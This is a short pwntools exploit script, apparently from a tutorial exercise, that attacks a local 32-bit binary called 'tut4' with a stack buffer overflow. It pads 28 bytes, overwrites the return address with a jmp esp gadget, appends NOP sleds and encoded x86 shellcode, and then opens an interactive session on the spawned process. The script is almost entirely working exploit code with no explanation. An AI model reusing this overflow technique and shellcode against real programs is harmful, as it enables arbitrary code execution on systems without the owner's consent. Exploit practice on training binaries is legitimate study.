from pwn import *
# context.log_level = "debug"
elf = context.binary = ELF("tut4")

gs = '''
b *0x08049193
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

r = start()

shellcode =  b""
shellcode += b"\x29\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\xd9\xf5\x87\xf4\x83\xee\xfc"
shellcode += b"\xe2\xf4\xb3\xfe\xdf\x6d\x8b\x93\xef\xd9\xba"
shellcode += b"\x7c\x60\x9c\xf6\x86\xef\xf4\xb1\xda\xe5\x9d"
shellcode += b"\xb7\x7c\x64\xa6\x31\xfd\x87\xf4\xd9\xda\xe5"
shellcode += b"\x9d\xb7\xda\xf4\x9c\xd9\xa2\xd4\x7d\x38\x38"
shellcode += b"\x07\xf4"


# 0x08049193
# b"\x93\x91\x04\x08"
jmp_esp = p32(0x08049193)

padding = b"\x90" * 20

payload = b'A' * 28 + jmp_esp + padding + shellcode + padding
# payload = b'A' * 28 + b'B'*4

#payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ade3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah76Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9'
info('sending exploit')
r.sendlineafter(b'\n', payload)

# r.sendline(b"uname -a")
r.interactive()
